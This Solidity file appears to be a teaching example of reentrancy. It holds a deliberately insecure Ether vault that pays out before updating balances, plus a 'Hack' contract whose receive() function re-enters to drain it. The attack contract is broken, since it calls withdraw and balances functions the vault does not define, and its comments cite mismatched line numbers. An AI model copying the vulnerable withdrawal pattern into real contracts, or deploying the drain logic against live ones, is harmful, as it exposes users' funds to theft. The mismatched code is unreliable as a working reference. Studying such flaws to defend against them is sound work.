// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

error e__InsufficientBalance();

// This contract is an example for an insecured wallet contract. 
// This can easily be attacked and drain all the money stored inside the contract.
// Best solution is to extend the contract using @Openzepplin/ReentrancyGuard 
contract C_02_InsecureEtherVault {
    mapping(address => uint256) private userBalances;

    function deposit() external payable {
        userBalances[msg.sender] += msg.value;
    }

    function withdrawAll() external {
        // if (userBalances[msg.sender] <= 0) revert e__InsufficientBalance();
        require(userBalances[msg.sender] > 0, "Insufficient Balance");
        (bool success, ) = msg.sender.call{value: userBalances[msg.sender]}("");
        require(success, "Failed to send Ether");

        userBalances[msg.sender ] = 0;
    }

    function getTotalBalance() external view returns(uint256) {
        return address(this).balance;
    }

    function getUserBalance(address _user) public view returns (uint256) {
        return userBalances[_user];
    }

}

contract Hack {
    function deposit(C_02_InsecureEtherVault _vault) external payable {
        // call .deposit to deposit to the vault
        _vault.deposit{value: msg.value}();
        
        // call .widthdraw to widthdraw all the balance => trigger the .call interaction @19
        // @notice .call interaction with empty data will invoke the receice() function @45 => trigger the draning logic
        _vault.widthraw(msg.value);
    }

    receive() external payable{
        // initialize the vault again
        C_02_InsecureEtherVault vault = C_02_InsecureEtherVault(msg.sender);
        
        // get the balance of the address
        uint balance = vault.balances(address(this));
        
        // @notice as in the `.call` interaction in `C_02_InsecureEtherVault.widthdraw()` happens before updating the state
        // => this condition down bellow is always true
        if (msg.sender.balance >= balance) {
            vault.widthraw(balance);
        }
    }

}
